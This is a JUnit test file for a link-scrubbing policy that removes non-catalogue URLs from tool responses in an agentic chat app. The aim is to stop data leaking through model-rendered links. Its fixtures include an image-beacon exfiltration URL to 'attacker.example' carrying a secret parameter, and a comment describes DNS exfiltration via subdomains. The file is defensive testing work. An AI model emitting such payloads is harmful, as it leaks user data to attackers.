package io.github.rodrigorjsf.agenticchat.tools.http;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.time.Duration;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The gate the issue asked for, in the shape that needs no per-tool fixture.
 *
 * <p>A test per projecting tool, each fed a recorded body, is the obvious answer
 * and it decays: the fixtures go stale, and a tool added next year has no fixture
 * at all, which is exactly the case the gate exists for.
 *
 * <p>So the check is on the policy rather than on the tools. It runs the catalogue
 * in <b>both directions</b> in one assertion — every configured host survives a
 * scrub, and every host outside the catalogue does not. A one-directional check
 * passes forever while the two halves drift: "removes doi.org" is satisfied by a
 * scrub that removes every link, which is the fix the issue proposed and which
 * would break {@code get_random_dog_image}; "keeps dog.ceo" is satisfied by a scrub
 * that removes nothing, which is where this started.
 */
class ToolLinkPolicyTest {

    /**
     * Five entries in the shapes {@code application.yml} actually contains: a plain
     * two-label host, a per-language subdomain, a bare registrable domain, a
     * {@code .gov.br} host whose public suffix has two labels, and a {@code www.}
     * host whose API path is nested.
     */
    private static final List<ApiEndpointProperties> CATALOGUE = List.of(
            endpoint("crossref", "https://api.crossref.org"),
            endpoint("wikipedia-pt", "https://pt.wikipedia.org"),
            endpoint("dog-ceo", "https://dog.ceo/api"),
            endpoint("ibge-localidades", "https://servicodados.ibge.gov.br/api/v1/localidades"),
            endpoint("themealdb", "https://www.themealdb.com/api/json/v1/1"));

    /**
     * One address per catalogue host, in the form that host really answers with.
     * {@code images.dog.ceo} is the case the issue names: the entire payload of
     * {@code get_random_dog_image} is this link, and it survives because the policy
     * matches the registrable domain of a host a tool calls.
     */
    private static final Map<String, String> LINKABLE = linkable();

    /** Hosts nothing in the catalogue calls. Each one costs the whole answer. */
    private static final Map<String, String> NOT_LINKABLE = Map.of(
            "doi.org", "https://doi.org/10.7717/peerj.4375",
            "orcid.org", "http://orcid.org/0000-0002-1825-0097",
            "www.bbcgoodfood.com", "https://www.bbcgoodfood.com/recipes/lasagne",
            "www.youtube.com", "https://www.youtube.com/watch?v=1234");

    private final LinkPolicy policy = new LinkPolicy(CATALOGUE, List.of("gov.br"));

    @Test
    @DisplayName("the catalogue runs in both directions: everything configured survives, everything else goes")
    void theCatalogueRunsInBothDirections() {
        var scrubbed = policy.scrub(bodyCarryingEveryLink());

        // The removal half first. A scrub that cannot remove anything passes every
        // "and this one is kept" assertion below, and that is the bug this file is
        // here for.
        NOT_LINKABLE.forEach((host, url) -> assertThat(scrubbed)
                .as("%s is not a host any tool calls, so no answer may link to it", host)
                .doesNotContain(host));

        // And the half that stops the fix from being "strip every URL".
        LINKABLE.forEach((host, url) -> assertThat(scrubbed)
                .as("%s is in the catalogue: an answer is allowed to cite it, and one tool "
                        + "returns nothing else", host)
                .contains(url));
    }

    @Test
    @DisplayName("JSON-escaped slashes are the same link, and a pattern anchored on // walks past them")
    void removesALinkWrittenWithEscapedSlashes() {
        var body = "{\"strSource\":\"https:\\/\\/www.bbcgoodfood.com\\/recipes\\/lasagne\"}";

        var scrubbed = policy.scrub(body);

        assertThat(scrubbed).doesNotContain("bbcgoodfood");
        assertThat(scrubbed).contains(LinkPolicy.REMOVED);
    }

    @Test
    @DisplayName("a scheme-relative address is fetched over the page's own scheme, with no click")
    void removesASchemeRelativeLinkInAJsonValue() {
        var body = "{\"url\":\"//attacker.example/p.png?d=secret\",\"id\":\"Q155\"}";

        var scrubbed = policy.scrub(body);

        assertThat(scrubbed).doesNotContain("attacker.example");
        assertThat(scrubbed).contains("Q155");
    }

    @Test
    @DisplayName("a scheme-relative address to a catalogue host is left alone")
    void keepsASchemeRelativeLinkToACatalogueHost() {
        // MediaWiki really does answer this, and wikidata.org is a host the tools call.
        var body = "{\"url\":\"//pt.wikipedia.org/wiki/Brasil\"}";

        assertThat(policy.scrub(body)).contains("//pt.wikipedia.org/wiki/Brasil");
    }

    @Test
    @DisplayName("ordinary text with a double slash in it is not a link and is not touched")
    void leavesProseAlone() {
        // The reason the scheme-relative pattern only fires at the start of a JSON
        // string value. A control that mangles ordinary text is a control that gets
        // switched off, and these bodies carry prose: a Wikipedia extract, an
        // abstract, a recipe instruction.
        var body = "{\"extract\":\"Escreve-se e//ou assim, no formato dd//mm//aaaa.\"}";

        assertThat(policy.scrub(body)).isEqualTo(body);
    }

    @Test
    @DisplayName("the replacement is not itself a link, and carries no host")
    void theMarkerCannotBeFollowed() {
        // A marker naming the host it removed would read better and reopen the
        // channel: <secret>.attacker.example is a DNS exfiltration payload on its
        // own, and several clients turn a bare domain into a link.
        assertThat(LinkPolicy.REMOVED).doesNotContain("http", "//", ".");
        assertThat(policy.scrub("{\"u\":\"https://doi.org/10.1/x\"}"))
                .isEqualTo("{\"u\":\"" + LinkPolicy.REMOVED + "\"}");
    }

    @Test
    @DisplayName("a full stop after a bare address belongs to the sentence, not to the host")
    void doesNotDeleteACatalogueLinkOverItsTrailingPunctuation() {
        // These bodies carry prose as well as fields — an abstract, a Wikipedia
        // extract, a licence notice — and in prose an address ends with the sentence.
        // Reading the stop as part of the host deletes the one citation the answer
        // was allowed to make, which is the same failure as leaving a third-party
        // link in, only pointed the other way.
        var body = "{\"extract\":\"Fonte: https://api.crossref.org. Consultado hoje.\"}";

        assertThat(policy.scrub(body)).isEqualTo(body);
        assertThat(policy.scrub("{\"e\":\"Veja https://doi.org.\"}")).doesNotContain("doi.org");
    }

    @Test
    void aBodyWithNoLinksIsReturnedUntouched() {
        var body = "{\"cep\":\"01310100\",\"localidade\":\"Sao Paulo\"}";

        assertThat(policy.scrub(body)).isSameAs(body);
        assertThat(policy.scrub(null)).isNull();
        assertThat(policy.scrub("")).isEmpty();
    }

    @Test
    @DisplayName("an empty result array survives byte-identical — three tools read 'nothing found' off it")
    void doesNotDisturbTheEmptyArrayThreeToolsProbeFor() {
        // DeveloperTools detects "no result" by string-matching the PROJECTED body:
        // "items":[] for Stack Overflow, "hits":[] for both Algolia tools, "docs":[]
        // for Maven Central. Those APIs answer an empty list with a 200, so nothing
        // upstream says "nothing found" — the probe is the only thing that does. A
        // scrub that widened its marker, or dropped the cheap guard below, would turn
        // three no-result answers into an empty envelope, which reads to a model as a
        // real answer with no fields.
        //
        // This one is PINNED, not red-able: an empty result set carries no address at
        // all, so scrub() returns on its no-"http" fast path and neither pattern ever
        // runs. What it grades is the guard and the marker, not the patterns. The
        // pattern half is aRemovedLinkDoesNotSwallowTheJsonAfterIt, below, which is
        // the assertion that can actually go red.
        var body = "{\"quota_remaining\":298,\"items\":[],\"hits\":[],\"docs\":[]}";

        assertThat(policy.scrub(body)).isSameAs(body);
    }

    @Test
    @DisplayName("a removed link stops at the JSON string that held it, and the fields after it survive")
    void aRemovedLinkDoesNotSwallowTheJsonAfterIt() {
        // The real Stack Exchange shape, one item, `filter=default`: two links this
        // catalogue may not carry, and after them the two fields the tool actually
        // reads. `search_stackoverflow` projects `quota_remaining` on purpose — 300
        // calls a day for the whole deployment — and the same three tools decide
        // "nothing found" by string-matching an empty array in the PROJECTED body,
        // which cannot exist if the scrub left the raw body unparseable.
        //
        // One byte is the whole margin. Widen the address pattern's tail from
        // [^\s"'<>]* to [^\s<>]* and the match runs from the first https: to the end
        // of a body that contains no whitespace: the item, the array, the quota and
        // the closing brace all leave with it.
        var body = "{\"items\":[{\"title\":\"How do you debug a GraalVM image heap error\","
                + "\"score\":42,\"link\":\"https://stackoverflow.com/questions/63328298/how-do-you-debug\","
                + "\"owner\":{\"profile_image\":\"https://www.gravatar.com/avatar/86713a\"}}],"
                + "\"has_more\":false,\"quota_remaining\":298}";

        var scrubbed = policy.scrub(body);

        assertThat(scrubbed).isEqualTo(
                "{\"items\":[{\"title\":\"How do you debug a GraalVM image heap error\","
                        + "\"score\":42,\"link\":\"" + LinkPolicy.REMOVED + "\","
                        + "\"owner\":{\"profile_image\":\"" + LinkPolicy.REMOVED + "\"}}],"
                        + "\"has_more\":false,\"quota_remaining\":298}");
    }

    @Test
    @DisplayName("removing a link in prose leaves the sentence's full stop where it was")
    void keepsTheSentenceStopAfterARemovedLink() {
        // The mirror of doesNotDeleteACatalogueLinkOverItsTrailingPunctuation. There
        // the trim decides whether a host is allowed; here it decides how much text
        // the replacement consumes. Trimming for the decision and then replacing the
        // untrimmed match takes the sentence's stop with the address, and these bodies
        // carry prose — a Wikipedia extract, an abstract, a licence notice — that the
        // model reads as text rather than as fields.
        var body = "{\"extract\":\"Fonte: https://doi.org/10.1/x. Consultado hoje.\"}";

        assertThat(policy.scrub(body))
                .isEqualTo("{\"extract\":\"Fonte: " + LinkPolicy.REMOVED + ". Consultado hoje.\"}");
    }

    @Test
    @DisplayName("a bracket that was part of the address is left behind after the marker — cosmetic, pinned so it is a known artifact")
    void leavesTheBracketOfAnAddressThatEndedInOne() {
        // NOT a specification. This pins a known cosmetic artifact so the next reader
        // does not mistake it for intent and defend it.
        //
        // TRAILING_PUNCTUATION does two jobs (see its javadoc) and only one of them
        // can be right here. On the HOST it must trim, or "Fonte: https://api.crossref.org."
        // deletes a citation the catalogue allows. On the WHOLE MATCH it re-appends
        // what it trimmed, or the sentence loses its stop. When the closing bracket
        // genuinely belonged to the ADDRESS — Wikipedia and DOI suffixes both produce
        // them — the second job hands it back to a sentence that never owned it, and
        // the marker is followed by a stray ")".
        //
        // Left alone on purpose. The output is still valid JSON, the address is gone,
        // and telling the two cases apart needs to know whether the bracket opened
        // inside the address — real parsing, on the hot path of every tool response,
        // to remove one character from a field the model is being told not to use.
        // The failure it would prevent is a stray bracket; the failure a bug here
        // would cause is a deleted citation or a surviving third-party host.
        //
        // If a later change DOES fix it, update the first expectation below — this
        // method records what happens today, it does not forbid the fix. The second
        // assertion is the one that is a contract.
        var body = "{\"e\":\"https://doi.org/10.1/x(y)\"}";

        assertThat(policy.scrub(body)).isEqualTo("{\"e\":\"" + LinkPolicy.REMOVED + ")\"}");
        // The half that matters is unconditional: no part of the host or path survives.
        assertThat(policy.scrub(body)).doesNotContain("doi.org", "10.1", "(y");
    }

    @Test
    @DisplayName("the derived set is registrable domains, so a subdomain of a source is linkable")
    void derivesRegistrableDomainsFromTheCatalogue() {
        assertThat(policy.domains())
                .containsExactlyInAnyOrder("crossref.org", "wikipedia.org", "dog.ceo",
                        "ibge.gov.br", "themealdb.com", "gov.br");
        assertThat(policy.allows("images.dog.ceo")).isTrue();
        assertThat(policy.allows("en.wikipedia.org")).isTrue();
        assertThat(policy.allows("attacker.example")).isFalse();
        // A host that merely ends with the same letters is not a subdomain.
        assertThat(policy.allows("evildog.ceo")).isFalse();
    }

    private static Map<String, String> linkable() {
        var links = new LinkedHashMap<String, String>();
        links.put("api.crossref.org", "https://api.crossref.org/works/10.1145/3292500.3330701");
        links.put("pt.wikipedia.org", "https://pt.wikipedia.org/wiki/Brasil");
        links.put("images.dog.ceo", "https://images.dog.ceo/breeds/beagle/n02088364_11136.jpg");
        links.put("servicodados.ibge.gov.br", "https://servicodados.ibge.gov.br/api/v1/localidades/estados");
        links.put("www.themealdb.com", "https://www.themealdb.com/images/media/meals/x.jpg");
        links.put("www.gov.br", "https://www.gov.br/inpi/pt-br");
        return links;
    }

    private static String bodyCarryingEveryLink() {
        var body = new StringBuilder("{");
        int i = 0;
        for (String url : LINKABLE.values()) {
            body.append("\"in").append(i++).append("\":\"").append(url).append("\",");
        }
        i = 0;
        for (String url : NOT_LINKABLE.values()) {
            body.append("\"out").append(i++).append("\":\"").append(url).append("\",");
        }
        return body.append("\"end\":true}").toString();
    }

    private static ApiEndpointProperties endpoint(String name, String baseUrl) {
        return new ApiEndpointProperties(name, baseUrl, Duration.ofSeconds(6), 1, 32_768, null);
    }
}
